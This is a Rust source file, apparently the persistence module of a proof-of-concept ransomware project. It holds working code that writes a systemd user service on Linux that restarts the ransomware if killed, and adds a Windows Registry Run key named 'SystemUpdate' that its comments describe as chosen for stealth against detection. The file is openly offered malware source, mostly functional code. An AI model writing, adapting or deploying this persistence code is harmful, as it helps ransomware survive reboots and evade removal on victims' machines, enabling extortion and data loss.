//! # System Persistence Module
//!
//! This module implements OS-specific persistence mechanisms to ensure the ransomware
//! survives system reboots. It uses native system facilities (systemd on Linux, Registry on Windows)
//! to auto-execute on user login or system startup.
//!
//! ## Linux: systemd User Service
//!
//! Creates a user-level systemd service that:
//! - Runs without root privileges (`~/.config/systemd/user/`)
//! - Starts automatically on user login (`default.target` dependency)
//! - Restarts only on crash (`Restart=on-failure`)
//! - Persists across reboots (`systemctl --user enable`)
//!
//! ## Windows: Registry Run Key
//!
//! Adds an entry to the Windows Registry:
//! - Location: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
//! - Key Name: `SystemUpdate` (mimics legitimate update service for stealth)
//! - Value: Full path to the ransomware executable
//! - Executes on user login (no admin rights required)
//!
//! ## Security Considerations
//!
//! - **No Privilege Escalation**: Uses user-level facilities only (HKCU, systemd --user)
//! - **Stealth**: Windows key name mimics system update service
//! - **Resilience**: Linux service auto-restarts on crash/kill attempts
//! - **Cross-Platform**: Conditional compilation ensures correct mechanism per OS

use dirs2::home_dir;
use std::{
    env,
    fs::{create_dir_all, File},
    io::{Error, Result, Write},
    process::Command,
};

/// Installs persistence on Linux using systemd user service.
///
/// Creates a systemd service file at `~/.config/systemd/user/ransomware.service`
/// that automatically starts the ransomware on user login and restarts it if killed.
///
/// # Service Configuration
///
/// ```ini
/// [Unit]
/// Description=PoC Ransomware
///
/// [Service]
/// Type=simple
/// ExecStart=/path/to/rustyransom
/// Restart=on-failure
///
/// [Install]
/// WantedBy=default.target
/// ```
///
/// # Process
///
/// 1. Get current executable path using `env::current_exe()`
/// 2. Construct systemd user directory path (`~/.config/systemd/user`)
/// 3. Create directory structure if it doesn't exist
/// 4. Write service file with executable path
/// 5. Reload systemd daemon (`systemctl --user daemon-reload`)
/// 6. Enable and start service (`systemctl --user enable --now ransomware.service`)
///
/// # Returns
///
/// * `Ok(())` - Persistence successfully installed and service started
/// * `Err(Error)` - Failed to create service file or execute systemctl commands
///
/// # Errors
///
/// - `Failed to find home directory` - Cannot resolve `$HOME`
/// - `Failed to execute systemctl command` - systemctl not available or exec error
/// - `systemctl daemon-reload failure` - Daemon reload failed (invalid service file)
/// - `systemctl enable --now failure` - Service enable/start failed
///
/// # Privileges
///
/// This function does NOT require root. systemd user services run under the user's
/// own privilege context and persist only for that user.
fn linux_persistence() -> Result<()> {
    let current_path = env::current_exe()?;
    let home = home_dir().ok_or(Error::other("Failed to find home directory"))?;
    let systemd_path = home.join(".config/systemd/user");
    let service_path = systemd_path.join("ransomware.service");

    // Systemd service unit file with crash recovery
    let service_str = format!(
        "[Unit]\nDescription=PoC Ransomware\n\n[Service]\nType=simple\nExecStart=\"{}\"\nRestart=on-failure\n\n[Install]\nWantedBy=default.target",
        current_path.to_string_lossy()
    );

    create_dir_all(systemd_path)?;
    let mut service_file = File::create(service_path)?;
    service_file.write_all(service_str.as_bytes())?;

    // Reload systemd to recognize new service
    let status = Command::new("systemctl")
        .args(["--user", "daemon-reload"])
        .status()
        .map_err(|_| Error::other("Failed to execute systemctl command"))?;

    if !status.success() {
        return Err(Error::other("systemctl daemon-reload failure"));
    }

    // Enable service (persists across reboots) and start immediately
    let status = Command::new("systemctl")
        .args(["--user", "enable", "--now", "ransomware.service"])
        .status()
        .map_err(|_| Error::other("Failed to execute systemctl command"))?;

    if status.success() {
        Ok(())
    } else {
        Err(Error::other("systemctl enable --now failure"))
    }
}

#[cfg(target_os = "windows")]
/// Installs persistence on Windows using Registry Run key.
///
/// Adds an entry to `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
/// that causes Windows to execute the ransomware automatically when the user logs in.
///
/// # Registry Configuration
///
/// - **Hive**: `HKEY_CURRENT_USER` (user-level, no admin required)
/// - **Key Path**: `Software\Microsoft\Windows\CurrentVersion\Run`
/// - **Value Name**: `SystemUpdate` (mimics legitimate Windows service for stealth)
/// - **Value Data**: Full path to ransomware executable
///
/// # Process
///
/// 1. Open `HKEY_CURRENT_USER` predefined registry key
/// 2. Create/open subkey `Software\Microsoft\Windows\CurrentVersion\Run`
/// 3. Set string value `SystemUpdate` = executable path
/// 4. Windows will auto-execute on next login
///
/// # Returns
///
/// * `Ok(())` - Registry entry successfully created
/// * `Err(Error)` - Failed to access registry or set value
///
/// # Errors
///
/// - Cannot get current executable path
/// - Registry key access denied (should never happen with HKCU)
/// - Failed to set registry value
///
/// # Privileges
///
/// This function does NOT require administrator privileges. `HKEY_CURRENT_USER`
/// is writable by the current user without elevation.
///
/// # Stealth
///
/// The value name `SystemUpdate` is chosen to blend in with legitimate Windows
/// update mechanisms, making detection less likely during casual inspection.
fn windows_persistence() -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    // Construct registry path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    let path = std::path::Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");

    let (key, _) = hkcu.create_subkey(&path)?;
    let exe_path = env::current_exe()?;

    // Set registry value: SystemUpdate = "C:\path\to\ransomware.exe"
    key.set_value("SystemUpdate", &exe_path.to_string_lossy().as_ref())?;
    Ok(())
}

/// Installs OS-appropriate persistence mechanism.
///
/// This is the public entry point for persistence installation. It automatically
/// selects the correct persistence method based on the target OS at compile time
/// using conditional compilation (`#[cfg(target_os = "...")]`).
///
/// # Behavior by OS
///
/// - **Linux**: Calls `linux_persistence()` - installs systemd user service
/// - **Windows**: Calls `windows_persistence()` - adds Registry Run key
/// - **Other OS**: Compilation will fail (no persistence implementation)
///
/// # Returns
///
/// * `Ok(())` - Persistence successfully installed
/// * `Err(Error)` - Failed to install persistence (see platform-specific errors)
///
/// # Usage
///
/// ```ignore
/// use crate::persistence::install_persistence;
///
/// match install_persistence() {
///     Ok(()) => println!("Persistence installed"),
///     Err(e) => eprintln!("Failed to install persistence: {e}"),
/// }
/// ```
///
/// # Design
///
/// This function uses Rust's compile-time conditional compilation to ensure
/// only the correct platform code is included in the final binary, reducing
/// attack surface and binary size.
pub fn install_persistence() -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        linux_persistence()
    }
    #[cfg(target_os = "windows")]
    {
        windows_persistence()
    }
}
